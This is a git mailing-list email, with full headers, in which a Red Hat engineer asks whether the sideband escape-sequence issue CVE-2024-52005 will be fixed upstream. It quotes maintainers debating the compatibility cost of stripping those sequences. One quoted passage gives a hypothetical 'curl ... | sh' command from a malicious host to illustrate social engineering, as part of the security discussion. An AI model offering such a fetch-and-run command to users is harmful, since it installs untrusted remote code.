Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F1D486AA7
	for <git@vger.kernel.org>; Tue, 28 Jan 2025 16:03:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.129.124
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1738080202; cv=none; b=PDEsId2FspQuDFp6HGIcC54a6MaTqkt9mmQICx9B9/DdnMfOCOUiASEoKu/6OkkiXng7EMfRvyGpGnAfjYaguuv0Jum/dQrYqQRRBcTrzDzQ333FAuyKrvMK0e0/x4zanqozarLml7i/wE65XeAAOY+e80aurgnvgHON/ziIYAU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1738080202; c=relaxed/simple;
	bh=7g9yhWtLVz3MYAKoP0yNbADpNGWQ4W44oP1p390TZ/8=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=rXNBQ3g10/ZKJuMVvNWLwd8YWX6fxd/RNMEsdIPR3LjSUEIjultLdh+mJEqlVEC6w+egQ2/hf7mgS/eCQiPqXq2ePJxvNXdUy7JIfkQazxoSK4Bdn67keMw2ejF/NzLCyZd40fVCwxgfbijgEFRiElAOJ55eF6//Jlj4gAKhuqk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=Qb2k1Xdm; arc=none smtp.client-ip=170.10.129.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=redhat.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="Qb2k1Xdm"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1738080199;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=rIz8ngx6PfSWvUIhAEUPDuz1TYX2Y2dugy1hCsjStxQ=;
	b=Qb2k1XdmTEImgRqQvJn2bFUKZNiGECcVC0xi4IyiFdA8tMt+yJdUZ13MXtjfb57TCfsH7+
	P0fl0aGTCjQs43kdF2lD8s40gwVuJOowGmAAfd5bxFr6pdwSvZkPsAWCIfbrRhEjQcpui+
	3EHbl1N6+fMn3ztIHLaPVBUhyPAru7U=
Received: from mail-ej1-f72.google.com (mail-ej1-f72.google.com
 [209.85.218.72]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
 us-mta-501-yObznor5NHKTwazSqHLF6Q-1; Tue, 28 Jan 2025 11:03:18 -0500
X-MC-Unique: yObznor5NHKTwazSqHLF6Q-1
X-Mimecast-MFC-AGG-ID: yObznor5NHKTwazSqHLF6Q
Received: by mail-ej1-f72.google.com with SMTP id a640c23a62f3a-ab341e14e27so660444066b.3
        for <git@vger.kernel.org>; Tue, 28 Jan 2025 08:03:18 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1738080197; x=1738684997;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=rIz8ngx6PfSWvUIhAEUPDuz1TYX2Y2dugy1hCsjStxQ=;
        b=aS3vR8Wspo5/XY0Ot2973JVsl6zyFYrPICAUxUo76LAA+/LCN4cUSspvwKb+vucf3u
         OB64j41ETJTWmfV5iD13JX4ZiyN9dnL1HAUTxacXthTnBhyu5rk+2AHceT0QyBkLxlOy
         7w2h+Nax5GOnOkXoDqhzvE5ICj3sa9qBJBuTUf/s+bs6WMiGFv9eTilW5wl14N8Oi1SD
         0xSKmxdyciOqd7hr1pUJECQfmc+90QgRQLq1UL4uNkgklndXfLesYJIX1gj4hSGPy9l3
         03wrBeifgo1UmXMMTeYYJ73FOtbI0++YHdlWlcIoOt9ezNwXUJEf0fLrIK6yWT49AKux
         EDXg==
X-Forwarded-Encrypted: i=1; AJvYcCXbsi3TODxGUHmn1Fwyz79/3d/S835SVaO1leBKslE5IuOFce6sVCobHdgEre00OIDXRog=@vger.kernel.org
X-Gm-Message-State: AOJu0Ywjxwx64ChqNLUYG9kXaqMamtHll0JqLTSu2DPng8VSx9Hhof9S
	7PaXes4nJviPTAGimu2r7WxiJ38MsaupCAvzCOACnYSDDFW556+gdA7YMS5TS1h7I+UCe4KUcvZ
	Iges/xpEQlZ6ySdH4KVWxwdkcl8EjW5BwsWmPk6fjWyELee3isSrS+UW8jTFp6K/ZivJc3UCmqo
	xeLjnEquGParLSJwZRNtIp99EN
X-Gm-Gg: ASbGncs4iio4kjGr+PXpkaeVWLzufQEwA57dDIr+wJuyV0Okzq00Svr+XHpL4bPnoA9
	iljGSkKIjtQlRE8BLgK+xe6aVLVZHUKfWFAekR3u1nQfSNJNORyTPN/ZAXlK1fXWbvj6qVG+gNl
	0ou0njpPDoIQXeR2S+2qQ=
X-Received: by 2002:a17:907:7faa:b0:a9e:b150:a99d with SMTP id a640c23a62f3a-ab38b1b45aamr4246798266b.5.1738080195378;
        Tue, 28 Jan 2025 08:03:15 -0800 (PST)
X-Google-Smtp-Source: AGHT+IHpgucLxN8DakVDUZtsNQ2QP/m8zN2S4UnS9u522HTGaYyYHiiIXXmb/C7bxBZwoKt+nkEuohqXQb43irwrcVk=
X-Received: by 2002:a17:907:7faa:b0:a9e:b150:a99d with SMTP id
 a640c23a62f3a-ab38b1b45aamr4246792566b.5.1738080194859; Tue, 28 Jan 2025
 08:03:14 -0800 (PST)
Precedence: bulk
X-Mailing-List: git@vger.kernel.org
List-Id: <git.vger.kernel.org>
List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <pull.1853.git.1736878772.gitgitgadget@gmail.com>
 <Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net> <xmqqwmevtfye.fsf@gitster.g>
In-Reply-To: <xmqqwmevtfye.fsf@gitster.g>
From: Ondrej Pohorelsky <opohorel@redhat.com>
Date: Tue, 28 Jan 2025 17:03:03 +0100
X-Gm-Features: AWEUYZnLoKPn03zeKUhvEVPS-7NWZQxOi68gB_ZeetQ0wYQbI92YHYaIdQIr5sI
Message-ID: <CA+B51BHQe_X=b9ncuwhBDi873OAZst=PAULiARs0NARy58VfnA@mail.gmail.com>
Subject: Re: [PATCH 0/3] Sanitize sideband channel messages
To: Junio C Hamano <gitster@pobox.com>
Cc: "brian m. carlson" <sandals@crustytoothpaste.net>, 
	Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>, git@vger.kernel.org, 
	Johannes Schindelin <johannes.schindelin@gmx.de>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,
I see that CVE-2024-52005 [0] has been assigned to this issue. From
the discussion, it seems the fix may not be shipped in the near
future, if at all.

Could you please confirm if I understand this correctly? Specifically,
that this is not being treated as a vulnerability and that the
proposed fix might introduce regressions for certain use cases?
We are bound by SLAs and need to decide soon whether to provide fixed
versions of Git in RHEL. Having clarity on the upstream stance would
be very helpful for our decision. Right now, we are inclined not to
ship these fixes unless they are accepted upstream.

[0] https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329


Best regards,
Ond=C5=99ej Poho=C5=99elsk=C3=BD


On Thu, Jan 16, 2025 at 7:47=E2=80=AFAM Junio C Hamano <gitster@pobox.com> =
wrote:
>
> "brian m. carlson" <sandals@crustytoothpaste.net> writes:
>
> > Where pre-receive hooks are available, people frequently run various
> > commands to test and analyze code in them, including build or static
> > analysis tools, such as Rust's Cargo.  Cargo is capable of printing a
> > wide variety of escape sequences in its output, including `\e[K`, which
> > overwrites text to the right (e.g., for progress bars and status output
> > much like Git produces), and sequences for hyperlinks.  Stripping these
> > sequences would break the output in ways that would be confusing to the
> > user (since they work fine in a regular terminal) and hard to
> > reproduce or fix.
>
> You have ruled out the attack vector that lets bytestream sent to
> the terminal emulator to somehow cause arbitrary input bytes added
> (which may require the final <ENTER> from the user but that is not
> much of consolation), and I tend to agree with you on that point.
>
> With that misfeature out of the picture, I am not sure why terminal
> escape sequences that may clear or write-over things on the screen
> are of particular interest.  If the malicious remote end says
> something like
>
>     To proceed, open another window and type this command:
>
>         $ curl https://my.malicious.xz/install.sh | sh
>
> to its output, even if the message is shown with the "remote: "
> prefix on the receiving local client, wouldn't that cause certain
> percentage of end-user population to copy-and-paste that command
> anyway?
>
> > I agree that this would have been a nice feature to add at the beginnin=
g
> > of the development of the sideband feature, but I fear that it is too
> > late to make an incompatible change now.
>
> So I am not so sure even it would have been a "nice feature" to disallow
> sideband messages to carry terminal escape sequences to begin with.
>
> > I realize that you've provided an escape hatch, but as we've seen with
> > other defense-in-depth measures, that doesn't avoid the inconvenience
> > and hassle of dealing with those changes and the costs of deploying
> > fixes everywhere.
>
> One more thing that I am not so happy about these "escape hatches"
> is that they tend to be all or nothing (not limited to this round,
> but common to other defense-in-depth attempts).  Having to say "I
> trust them completely" is something that would make people uneasy.
>
> > We need to consider the costs and impact of these
> > patches on our users, including the burden of dealing with incompatible
> > changes, and given the fact that this problem can occur in a wide
> > variety of other contexts which you are not solving here and which woul=
d
> > be better solved more generally in terminal emulators themselves, I
> > don't think the benefits of this approach outweigh the downsides.
> >
> > I do agree that there are terminal emulators which have some surprising
> > and probably insecure behaviour, as we've discussed in the past, but
> > because I believe those issues are more general and could be a problem
> > for any terminal-using program, I continue to believe that those issues
> > are best addressed in the terminal emulator itself.
>


--=20

Ond=C5=99ej Poho=C5=99elsk=C3=BD

Software Engineer

Red Hat

opohorel@redhat.com

